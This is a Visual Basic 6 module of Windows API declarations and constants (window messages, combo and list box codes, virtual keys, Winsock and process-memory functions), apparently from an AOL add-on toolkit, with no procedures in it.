Attribute VB_Name = "bong40"
Const PROCESS_VM_READ = &H10
Const STANDARD_RIGHTS_REQUIRED = &HF0000
Const SND_SYNC = &H0
Const SND_ASYNC = &H1
Const SND_NODEFAULT = &H2
Const SND_LOOP = &H8
Const SND_NOSTOP = &H10
Public Const GW_CHILD& = 5
Public Const GW_HWNDFIRST& = 0
Public Const GW_HWNDLAST& = 1
Public Const GW_HWNDNEXT& = 2
Public Const GW_HWNDPREV& = 3
Public Const GW_MAX& = 5
Public Const GW_OWNER& = 4
Public Const MB_ICONASTERISK& = &H40&
Public Const MB_ICONEXCLAMATION& = &H30&
Public Const MB_ICONHAND& = &H10&
Public Const MB_ICONQUESTION& = &H20&
Public Const CB_ADDSTRING& = &H143
Public Const CB_DELETESTRING& = &H144
Public Const CB_DIR& = &H145
Public Const CB_ERR& = (-1)
Public Const CB_ERRSPACE& = (-2)
Public Const CB_FINDSTRING& = &H14C
Public Const CB_FINDSTRINGEXACT& = &H158
Public Const CB_GETCOUNT& = &H146
Public Const CB_GETCURSEL& = &H147
Public Const CB_GETDROPPEDCONTROLRECT& = &H152
Public Const CB_GETDROPPEDSTATE& = &H157
Public Const CB_GETDROPPEDWIDTH& = &H15F
Public Const CB_GETEDITSEL& = &H140
Public Const CB_GETEXTENDEDUI& = &H156
Public Const CB_GETHORIZONTALEXTENT& = &H15D
Public Const CB_GETITEMDATA& = &H150
Public Const CB_GETITEMHEIGHT& = &H154
Public Const CB_GETLBTEXT& = &H148
Public Const CB_GETLBTEXTLEN& = &H149
Public Const CB_GETLOCALE& = &H15A
Public Const CB_GETTOPINDEX& = &H15B
Public Const CB_INITSTORAGE& = &H161
Public Const CB_INSERTSTRING& = &H14A
Public Const CB_LIMITTEXT& = &H141
Public Const CB_MSGMAX& = &H15B
Public Const CB_OKAY& = 0
Public Const CB_RESETCONTENT& = &H14B
Public Const CB_SELECTSTRING& = &H14D
Public Const CB_SETCURSEL& = &H14E
Public Const CB_SETDROPPEDWIDTH& = &H160
Public Const CB_SETEDITSEL& = &H142
Public Const CB_SETEXTENDEDUI& = &H155
Public Const CB_SETHORIZONTALEXTENT& = &H15E
Public Const CB_SETITEMDATA& = &H151
Public Const CB_SETITEMHEIGHT& = &H153
Public Const CB_SETLOCALE& = &H159
Public Const CB_SETTOPINDEX& = &H15C
Public Const CBF_FAIL_ADVISES& = &H4000
Public Const CBF_FAIL_ALLSVRXACTIONS& = &H3F000
Public Const CBF_FAIL_CONNECTIONS& = &H2000
Public Const CBF_FAIL_EXECUTES& = &H8000&
Public Const CBF_FAIL_POKES& = &H10000
Public Const CBF_FAIL_REQUESTS& = &H20000
Public Const CBF_FAIL_SELFCONNECTIONS& = &H1000
Public Const CBF_SKIP_ALLNOTIFICATIONS& = &H3C0000
Public Const CBF_SKIP_CONNECT_CONFIRMS& = &H40000
Public Const CBF_SKIP_DISCONNECTS& = &H200000
Public Const CBF_SKIP_REGISTRATIONS& = &H80000
Public Const CBF_SKIP_UNREGISTRATIONS& = &H100000
Public Const CBM_CREATEDIB& = &H2
Public Const CBM_INIT& = &H4
Public Const CBN_CLOSEUP& = 8
Public Const CBN_DBLCLK& = 2
Public Const CBN_DROPDOWN& = 7
Public Const CBN_EDITCHANGE& = 5
Public Const CBN_EDITUPDATE& = 6
Public Const CBN_ERRSPACE& = (-1)
Public Const CBN_KILLFOCUS& = 4
Public Const CBN_SELCHANGE& = 1
Public Const CBN_SELENDCANCEL& = 10
Public Const CBN_SELENDOK& = 9
Public Const CBN_SETFOCUS& = 3
Public Const CBR_110& = 110
Public Const CBR_115200& = 115200
Public Const CBR_1200& = 1200
Public Const CBR_128000& = 128000
Public Const CBR_14400& = 14400
Public Const CBR_19200& = 19200
Public Const CBR_2400& = 2400
Public Const CBR_256000& = 256000
Public Const CBR_300& = 300
Public Const CBR_38400& = 38400
Public Const CBR_4800& = 4800
Public Const CBR_56000& = 56000
Public Const CBR_57600& = 57600
Public Const CBR_600& = 600
Public Const CBR_9600& = 9600
Public Const CBR_BLOCK& = &HFFFF
Public Const CBS_AUTOHSCROLL& = &H40&
Public Const CBS_DISABLENOSCROLL& = &H800&
Public Const CBS_DROPDOWN& = &H2&
Public Const CBS_DROPDOWNLIST& = &H3&
Public Const CBS_HASSTRINGS& = &H200&
Public Const CBS_LOWERCASE& = &H4000&
Public Const CBS_NOINTEGRALHEIGHT& = &H400&
Public Const CBS_OEMCONVERT& = &H80&
Public Const CBS_OWNERDRAWFIXED& = &H10&
Public Const CBS_OWNERDRAWVARIABLE& = &H20&
Public Const CBS_SIMPLE& = &H1&
Public Const CBS_SORT& = &H100&
Public Const CBS_UPPERCASE& = &H2000&
Public Const LB_ADDFILE& = &H196
Public Const LB_ADDSTRING& = &H180
Public Const LB_CTLCODE& = 0&
Public Const LB_DELETESTRING& = &H182
Public Const LB_DIR& = &H18D
Public Const LB_ERR& = (-1)
Public Const LB_ERRSPACE& = (-2)
Public Const LB_FINDSTRING& = &H18F
Public Const LB_FINDSTRINGEXACT& = &H1A2
Public Const LB_GETANCHORINDEX& = &H19D
Public Const LB_GETCARETINDEX& = &H19F
Public Const LB_GETCOUNT& = &H18B
Public Const LB_GETCURSEL& = &H188
Public Const LB_GETHORIZONTALEXTENT& = &H193
Public Const LB_GETITEMDATA& = &H199
Public Const LB_GETITEMHEIGHT& = &H1A1
Public Const LB_GETITEMRECT& = &H198
Public Const LB_GETLOCALE& = &H1A6
Public Const LB_GETSEL& = &H187
Public Const LB_GETSELCOUNT& = &H190
Public Const LB_GETSELITEMS& = &H191
Public Const LB_GETTEXT& = &H189
Public Const LB_GETTEXTLEN& = &H18A
Public Const LB_GETTOPINDEX& = &H18E
Public Const LB_INITSTORAGE& = &H1A8
Public Const LB_INSERTSTRING& = &H181
Public Const LB_ITEMFROMPOINT& = &H1A9
Public Const LB_MSGMAX& = &H1A8
Public Const LB_OKAY& = 0
Public Const LB_RESETCONTENT& = &H184
Public Const LB_SELECTSTRING& = &H18C
Public Const LB_SELITEMRANGE& = &H19B
Public Const LB_SELITEMRANGEEX& = &H183
Public Const LB_SETANCHORINDEX& = &H19C
Public Const LB_SETCARETINDEX& = &H19E
Public Const LB_SETCOLUMNWIDTH& = &H195
Public Const LB_SETCOUNT& = &H1A7
Public Const LB_SETCURSEL& = &H186
Public Const LB_SETHORIZONTALEXTENT& = &H194
Public Const LB_SETITEMDATA& = &H19A
Public Const LB_SETITEMHEIGHT& = &H1A0
Public Const LB_SETLOCALE& = &H1A5
Public Const LB_SETSEL& = &H185
Public Const LB_SETTABSTOPS& = &H192
Public Const LB_SETTOPINDEX& = &H197
Public Const LBN_DBLCLK& = 2
Public Const LBN_ERRSPACE& = (-2)
Public Const LBN_KILLFOCUS& = 5
Public Const LBN_SELCANCEL& = 3
Public Const LBN_SELCHANGE& = 1
Public Const LBN_SETFOCUS& = 4
Public Const LBS_DISABLENOSCROLL& = &H1000&
Public Const LBS_EXTENDEDSEL& = &H800&
Public Const LBS_HASSTRINGS& = &H40&
Public Const LBS_MULTICOLUMN& = &H200&
Public Const LBS_MULTIPLESEL& = &H8&
Public Const LBS_NODATA& = &H2000&
Public Const LBS_NOINTEGRALHEIGHT& = &H100&
Public Const LBS_NOREDRAW& = &H4&
Public Const LBS_NOSEL& = &H4000&
Public Const LBS_NOTIFY& = &H1&
Public Const LBS_OWNERDRAWFIXED& = &H10&
Public Const LBS_OWNERDRAWVARIABLE& = &H20&
Public Const LBS_SORT& = &H2&
Public Const LBS_USETABSTOPS& = &H80&
Public Const LBS_WANTKEYBOARDINPUT& = &H400&
Public Const NIF_ICON = &H2
Public Const NIF_MESSAGE = &H1
Public Const NIF_TIP = &H4
Public Const NIM_ADD = &H0
Public Const NIM_DELETE = &H2
Public Const NIM_MODIFY = &H1
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const Flag = SWP_NOMOVE Or SWP_NOSIZE
Public Const WM_ACTIVATE& = &H6
Public Const WM_ACTIVATEAPP& = &H1C
Public Const WM_AFXFIRST& = &H360
Public Const WM_AFXLAST& = &H37F
Public Const WM_APP& = &H8000&
Public Const WM_ASKCBFORMATNAME& = &H30C
Public Const WM_CANCELJOURNAL& = &H4B
Public Const WM_CANCELMODE& = &H1F
Public Const WM_CAPTURECHANGED& = &H215
Public Const WM_CHANGECBCHAIN& = &H30D
Public Const WM_CHAR& = &H102
Public Const WM_CHARTOITEM& = &H2F
Public Const WM_CHILDACTIVATE& = &H22
Public Const WM_CLEAR& = &H303
Public Const WM_CLOSE& = &H10
Public Const WM_COMMAND& = &H111
Public Const WM_COMMNOTIFY& = &H44
Public Const WM_COMPACTING& = &H41
Public Const WM_COMPAREITEM& = &H39
Public Const WM_CONTEXTMENU& = &H7B
Public Const WM_CONVERTREQUESTEX& = &H108
Public Const WM_COPY& = &H301
Public Const WM_COPYDATA& = &H4A
Public Const WM_CREATE& = &H1
Public Const WM_CTLCOLORBTN& = &H135
Public Const WM_CTLCOLORDLG& = &H136
Public Const WM_CTLCOLOREDIT& = &H133
Public Const WM_CTLCOLORLISTBOX& = &H134
Public Const WM_CTLCOLORMSGBOX& = &H132
Public Const WM_CTLCOLORSCROLLBAR& = &H137
Public Const WM_CTLCOLORSTATIC& = &H138
Public Const WM_CUT& = &H300
Public Const WM_DDE_FIRST& = &H3E0
Public Const WM_DEADCHAR& = &H103
Public Const WM_DELETEITEM& = &H2D
Public Const WM_DESTROY& = &H2
Public Const WM_DESTROYCLIPBOARD& = &H307
Public Const WM_DEVICECHANGE& = &H219
Public Const WM_DEVMODECHANGE& = &H1B
Public Const WM_DISPLAYCHANGE& = &H7E
Public Const WM_DRAWCLIPBOARD& = &H308
Public Const WM_DRAWITEM& = &H2B
Public Const WM_DROPFILES& = &H233
Public Const WM_ENABLE& = &HA
Public Const WM_ENDSESSION& = &H16
Public Const WM_ENTERIDLE& = &H121
Public Const WM_ENTERMENULOOP& = &H211
Public Const WM_ERASEBKGND& = &H14
Public Const WM_EXITMENULOOP& = &H212
Public Const WM_FONTCHANGE& = &H1D
Public Const WM_GETDLGCODE& = &H87
Public Const WM_GETFONT& = &H31
Public Const WM_GETHOTKEY& = &H33
Public Const WM_GETICON& = &H7F
Public Const WM_GETMINMAXINFO& = &H24
Public Const WM_GETTEXT& = &HD
Public Const WM_GETTEXTLENGTH& = &HE
Public Const WM_HANDHELDFIRST& = &H358
Public Const WM_HANDHELDLAST& = &H35F
Public Const WM_HELP& = &H53
Public Const WM_HOTKEY& = &H312
Public Const WM_HSCROLL& = &H114
Public Const WM_HSCROLLCLIPBOARD& = &H30E
Public Const WM_ICONERASEBKGND& = &H27
Public Const WM_IME_CHAR& = &H286
Public Const WM_IME_COMPOSITION& = &H10F
Public Const WM_IME_COMPOSITIONFULL& = &H284
Public Const WM_IME_CONTROL& = &H283
Public Const WM_IME_ENDCOMPOSITION& = &H10E
Public Const WM_IME_KEYDOWN& = &H290
Public Const WM_IME_KEYLAST& = &H10F
Public Const WM_IME_KEYUP& = &H291
Public Const WM_IME_NOTIFY& = &H282
Public Const WM_IME_SELECT& = &H285
Public Const WM_IME_SETCONTEXT& = &H281
Public Const WM_IME_STARTCOMPOSITION& = &H10D
Public Const WM_INITDIALOG& = &H110
Public Const WM_INITMENU& = &H116
Public Const WM_INITMENUPOPUP& = &H117
Public Const WM_INPUTLANGCHANGE& = &H51
Public Const WM_INPUTLANGCHANGEREQUEST& = &H50
Public Const WM_KEYDOWN& = &H100
Public Const WM_KEYFIRST& = &H100
Public Const WM_KEYLAST& = &H108
Public Const WM_KEYUP& = &H101
Public Const WM_KILLFOCUS& = &H8
Public Const WM_LBUTTONDBLCLK& = &H203
Public Const WM_LBUTTONDOWN& = &H201
Public Const WM_LBUTTONUP& = &H202
Public Const WM_MBUTTONDBLCLK& = &H209
Public Const WM_MBUTTONDOWN& = &H207
Public Const WM_MBUTTONUP& = &H208
Public Const WM_MDIACTIVATE& = &H222
Public Const WM_MDICASCADE& = &H227
Public Const WM_MDICREATE& = &H220
Public Const WM_MDIDESTROY& = &H221
Public Const WM_MDIGETACTIVE& = &H229
Public Const WM_MDIICONARRANGE& = &H228
Public Const WM_MDIMAXIMIZE& = &H225
Public Const WM_MDINEXT& = &H224
Public Const WM_MDIREFRESHMENU& = &H234
Public Const WM_MDIRESTORE& = &H223
Public Const WM_MDISETMENU& = &H230
Public Const WM_MDITILE& = &H226
Public Const WM_MEASUREITEM& = &H2C
Public Const WM_MENUCHAR& = &H120
Public Const WM_MENUSELECT& = &H11F
Public Const WM_MOUSEACTIVATE& = &H21
Public Const WM_MOUSEFIRST& = &H200
Public Const WM_MOUSELAST& = &H209
Public Const WM_MOUSEMOVE& = &H200
Public Const WM_MOVE& = &H3
Public Const WM_MOVING& = &H216
Public Const WM_NCACTIVATE& = &H86
Public Const WM_NCCALCSIZE& = &H83
Public Const WM_NCCREATE& = &H81
Public Const WM_NCDESTROY& = &H82
Public Const WM_NCHITTEST& = &H84
Public Const WM_NCLBUTTONDBLCLK& = &HA3
Public Const WM_NCLBUTTONDOWN& = &HA1
Public Const WM_NCLBUTTONUP& = &HA2
Public Const WM_NCMBUTTONDBLCLK& = &HA9
Public Const WM_NCMBUTTONDOWN& = &HA7
Public Const WM_NCMBUTTONUP& = &HA8
Public Const WM_NCMOUSEMOVE& = &HA0
Public Const WM_NCPAINT& = &H85
Public Const WM_NCRBUTTONDBLCLK& = &HA6
Public Const WM_NCRBUTTONDOWN& = &HA4
Public Const WM_NCRBUTTONUP& = &HA5
Public Const WM_NEXTDLGCTL& = &H28
Public Const WM_NEXTMENU& = &H213
Public Const WM_NOTIFY& = &H4E
Public Const WM_NOTIFYFORMAT& = &H55
Public Const WM_NULL& = &H0
Public Const WM_OTHERWINDOWCREATED& = &H42
Public Const WM_OTHERWINDOWDESTROYED& = &H43
Public Const WM_PAINT& = &HF
Public Const WM_PAINTCLIPBOARD& = &H309
Public Const WM_PAINTICON& = &H26
Public Const WM_PALETTECHANGED& = &H311
Public Const WM_PALETTEISCHANGING& = &H310
Public Const WM_PARENTNOTIFY& = &H210
Public Const WM_PASTE& = &H302
Public Const WM_PENWINFIRST& = &H380
Public Const WM_PENWINLAST& = &H38F
Public Const WM_POWER& = &H48
Public Const WM_POWERBROADCAST& = &H218
Public Const WM_PRINT& = &H317
Public Const WM_PRINTCLIENT& = &H318
Public Const WM_QUERYDRAGICON& = &H37
Public Const WM_QUERYENDSESSION& = &H11
Public Const WM_QUERYNEWPALETTE& = &H30F
Public Const WM_QUERYOPEN& = &H13
Public Const WM_QUEUESYNC& = &H23
Public Const WM_QUIT& = &H12
Public Const WM_RBUTTONDBLCLK& = &H206
Public Const WM_RBUTTONDOWN& = &H204
Public Const WM_RBUTTONUP& = &H205
Public Const WM_RENDERALLFORMATS& = &H306
Public Const WM_RENDERFORMAT& = &H305
Public Const WM_SETCURSOR& = &H20
Public Const WM_SETFOCUS& = &H7
Public Const WM_SETFONT& = &H30
Public Const WM_SETHOTKEY& = &H32
Public Const WM_SETICON& = &H80
Public Const WM_SETREDRAW& = &HB
Public Const WM_SETTEXT& = &HC
Public Const WM_SETTINGCHANGE& = &H1A
Public Const WM_SHOWWINDOW& = &H18
Public Const WM_SIZE& = &H5
Public Const WM_SIZECLIPBOARD& = &H30B
Public Const WM_SIZING& = &H214
Public Const WM_SPOOLERSTATUS& = &H2A
Public Const WM_STYLECHANGED& = &H7D
Public Const WM_STYLECHANGING& = &H7C
Public Const WM_SYSCHAR& = &H106
Public Const WM_SYSCOLORCHANGE& = &H15
Public Const WM_SYSCOMMAND& = &H112
Public Const WM_SYSDEADCHAR& = &H107
Public Const WM_SYSKEYDOWN& = &H104
Public Const WM_SYSKEYUP& = &H105
Public Const WM_TCARD& = &H52
Public Const WM_TIMECHANGE& = &H1E
Public Const WM_TIMER& = &H113
Public Const WM_UNDO& = &H304
Public Const WM_USER& = &H400
Public Const WM_USERCHANGED& = &H54
Public Const WM_VKEYTOITEM& = &H2E
Public Const WM_VSCROLL& = &H115
Public Const WM_VSCROLLCLIPBOARD& = &H30A
Public Const WM_WINDOWPOSCHANGED& = &H47
Public Const WM_WINDOWPOSCHANGING& = &H46
Public Const WM_WININICHANGE& = &H1A
Public Const AOL_SCROLL = &H3606
Public Const VK_ADD& = &H6B
Public Const VK_ATTN& = &HF6
Public Const VK_BACK& = &H8
Public Const VK_CANCEL& = &H3
Public Const VK_CAPITAL& = &H14
Public Const VK_CLEAR& = &HC
Public Const VK_CONTROL& = &H11
Public Const VK_CRSEL& = &HF7
Public Const VK_DECIMAL& = &H6E
Public Const VK_DELETE& = &H2E
Public Const VK_DIVIDE& = &H6F
Public Const VK_DOWN& = &H28
Public Const VK_END& = &H23
Public Const VK_EREOF& = &HF9
Public Const VK_ESCAPE& = &H1B
Public Const VK_EXECUTE& = &H2B
Public Const VK_EXSEL& = &HF8
Public Const VK_F1& = &H70
Public Const VK_F10& = &H79
Public Const VK_F11& = &H7A
Public Const VK_F12& = &H7B
Public Const VK_F13& = &H7C
Public Const VK_F14& = &H7D
Public Const VK_F15& = &H7E
Public Const VK_F16& = &H7F
Public Const VK_F17& = &H80
Public Const VK_F18& = &H81
Public Const VK_F19& = &H82
Public Const VK_F2& = &H71
Public Const VK_F20& = &H83
Public Const VK_F21& = &H84
Public Const VK_F22& = &H85
Public Const VK_F23& = &H86
Public Const VK_F24& = &H87
Public Const VK_F3& = &H72
Public Const VK_F4& = &H73
Public Const VK_F5& = &H74
Public Const VK_F6& = &H75
Public Const VK_F7& = &H76
Public Const VK_F8& = &H77
Public Const VK_F9& = &H78
Public Const VK_HELP& = &H2F
Public Const VK_HOME& = &H24
Public Const VK_INSERT& = &H2D
Public Const VK_LBUTTON& = &H1
Public Const VK_LCONTROL& = &HA2
Public Const VK_LEFT& = &H25
Public Const VK_LMENU& = &HA4
Public Const VK_LSHIFT& = &HA0
Public Const VK_MBUTTON& = &H4
Public Const VK_MENU& = &H12
Public Const VK_MULTIPLY& = &H6A
Public Const VK_NEXT& = &H22
Public Const VK_NONAME& = &HFC
Public Const VK_NUMLOCK& = &H90
Public Const VK_NUMPAD0& = &H60
Public Const VK_NUMPAD1& = &H61
Public Const VK_NUMPAD2& = &H62
Public Const VK_NUMPAD3& = &H63
Public Const VK_NUMPAD4& = &H64
Public Const VK_NUMPAD5& = &H65
Public Const VK_NUMPAD6& = &H66
Public Const VK_NUMPAD7& = &H67
Public Const VK_NUMPAD8& = &H68
Public Const VK_NUMPAD9& = &H69
Public Const VK_OEM_CLEAR& = &HFE
Public Const VK_PA1& = &HFD
Public Const VK_PAUSE& = &H13
Public Const VK_PLAY& = &HFA
Public Const VK_PRINT& = &H2A
Public Const VK_PRIOR& = &H21
Public Const VK_PROCESSKEY = &HE5
Public Const VK_RBUTTON& = &H2
Public Const VK_RCONTROL& = &HA3
Public Const VK_RETURN& = &HD
Public Const VK_RIGHT& = &H27
Public Const VK_RMENU& = &HA5
Public Const VK_RSHIFT& = &HA1
Public Const VK_SCROLL& = &H91
Public Const VK_SELECT& = &H29
Public Const VK_SEPARATOR& = &H6C
Public Const VK_SHIFT& = &H10
Public Const VK_SNAPSHOT& = &H2C
Public Const VK_SPACE& = &H20
Public Const VK_SUBTRACT& = &H6D
Public Const VK_TAB& = &H9
Public Const VK_UP& = &H26
Public Const VK_ZOOM& = &HFB
Public Const EM_SETSEL& = &HB1
Public Const SW_ERASE& = &H4
Public Const SW_HIDE& = 0
Public Const SW_INVALIDATE& = &H2
Public Const SW_MAX& = 10
Public Const SW_MAXIMIZE& = 3
Public Const SW_MINIMIZE& = 6
Public Const SW_NORMAL& = 1
Public Const SW_OTHERUNZOOM& = 4
Public Const SW_OTHERZOOM& = 2
Public Const SW_PARENTCLOSING& = 1
Public Const SW_PARENTOPENING& = 3
Public Const SW_RESTORE& = 9
Public Const SW_SCROLLCHILDREN& = &H1
Public Const SW_SHOW& = 5
Public Const SW_SHOWDEFAULT& = 10
Public Const SW_SHOWMAXIMIZED& = 3
Public Const SW_SHOWMINIMIZED& = 2
Public Const SW_SHOWMINNOACTIVE& = 7
Public Const SW_SHOWNA& = 8
Public Const SW_SHOWNOACTIVATE& = 4
Public Const SW_SHOWNORMAL& = 1
Public Const EWX_FORCE& = 4
Public Const EWX_LOGOFF& = 0
Public Const EWX_REBOOT& = 2
Public Const EWX_SHUTDOWN& = 1
Public Const BM_SETSTATE = &HF3
Public Const SC_MOVE = &HF012
Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2
Public Const SND_FLAG = SND_ASYNC Or SND_NODEFAULT
Public Const SPI_SCREENSAVERRUNNING = 97
Public Const BM_GETCHECK = &HF0
Public Const BM_SETCHECK = &HF1
Public Const SM_CLEANBOOT = 67
Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000
Public Const ENTER_KEY = 13
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Public RoomHandle%
Private Const SWP_SHOWWINDOW = &H40
Private Const SWP_HIDEWINDOW = &H80
Public Const SPIF_UPDATEINIFILE = &H1
Public Const SPI_SETDESKWALLPAPER = 20
Public Const SPIF_SENDWININICHANGE = &H2
Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&
Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)
Global Const WINDING = 2
Global Const ALTERNATE = 1
Global Const RGN_OR = 2
Dim nXCoord(50) As Integer
Dim nYCoord(50) As Integer
Dim nXSpeed(50) As Integer
Dim nYSpeed(50) As Integer
Const HKEY_CLASSES_ROOT = &H80000000
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const HKEY_USERS = &H80000003
Const HKEY_PERFORMANCE_DATA = &H80000004
Const HKEY_CURRENT_CONFIG As Long = &H80000005
Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
   X As Long
   Y As Long
End Type

Public Const FADE_RED = &HFF&
Public Const FADE_GREEN = &HFF00&
Public Const FADE_BLUE = &HFF0000
Public Const FADE_YELLOW = &HFFFF&
Public Const FADE_WHITE = &HC0FFFF
Public Const FADE_BLACK = &H0&
Public Const FADE_PURPLE = &HFF00FF
Public Const FADE_GREY = &HC0C0C0
Public Const FADE_PINK = &HFF80FF
Public Const FADE_TURQUOISE = &HC0C000
Public Const red = &HFF&
Public Const green = &HFF00&
Public Const blue = &HFF0000
Public Const yellow = &HFFFF&
Public Const white = &HC0FFFF
Public Const black = &H0&
Public Const purple = &HFF00FF
Public Const grey = &HC0C0C0
Public Const pink = &HFF80FF
Public Const turqouise = &HC0C000
Public Const orange = &H80FF&
Public Const brown = &H4080&
Private Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long
Declare Function ClipCursor Lib "user32" (lpRect As Any) As Long
Private Declare Function IsCharAlpha Lib "user32" Alias "IsCharAlphaA" (ByVal cChar As Byte) As Long
Private Declare Function IsCharAlphaNumeric Lib "user32" Alias "IsCharAlphaNumericA" (ByVal cChar As Byte) As Long
Public Declare Function WSAGetLastError Lib "WSOCK32.DLL" () As Long
Public Declare Function WSAStartup Lib "WSOCK32.DLL" (ByVal wVersionRequired&, lpWSAData As WSADATA) As Long
Public Declare Function WSACleanup Lib "WSOCK32.DLL" () As Long
Public Declare Function gethostname Lib "WSOCK32.DLL" (ByVal hostname$, HostLen&) As Long
Public Declare Function gethostbyname Lib "WSOCK32.DLL" (ByVal hostname$) As Long
Public Const WS_VERSION_REQD = &H101
Public Const WS_VERSION_MAJOR = WS_VERSION_REQD \ &H100 And &HFF&
Public Const WS_VERSION_MINOR = WS_VERSION_REQD And &HFF&
Public Const MIN_SOCKETS_REQD = 1
Public Const SOCKET_ERROR = -1
Public Const WSADescription_Len = 256
Public Const WSASYS_Status_Len = 128
Public Type WSADATA
       wversion As Integer
       wHighVersion As Integer
       szDescription(0 To WSADescription_Len) As Byte
       szSystemStatus(0 To WSASYS_Status_Len) As Byte
       iMaxSockets As Integer
       iMaxUdpDg As Integer
       lpszVendorInfo As Long
End Type
Public Type HOSTENT
       hName As Long
       hAliases As Long
       hAddrType As Integer
       hLength As Integer
       hAddrList As Long
End Type
Declare Function BringWindowToTop& Lib "user32" (ByVal hwnd As Long)
Declare Function LockWindowUpdate Lib "user32" (ByVal hwndLock As Long) As Long
Declare Function VkKeyScan Lib "user32" Alias "VkKeyScanA" (ByVal cChar As Byte) As Integer
Private Declare Function GetTempPathA Lib "kernel32" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Declare Function SetSystemPowerState Lib "kernel32" (ByVal fSuspend As Long, ByVal fForce As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, source As Any, ByVal Length As Long)
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long

Public Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Public Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function GetTickCount& Lib "kernel32" ()
Public Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hWndCallback As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd&, ByVal wMsg&, ByVal wParam&, ByVal lParam&)
Declare Function GetWindow& Lib "user32" (ByVal hwnd&, ByVal wCmd&)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd&, ByVal lpClassName$, ByVal nMaxCount&)
Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function SetKeyboardState Lib "user32" (lppbKeyState As Byte) As Long
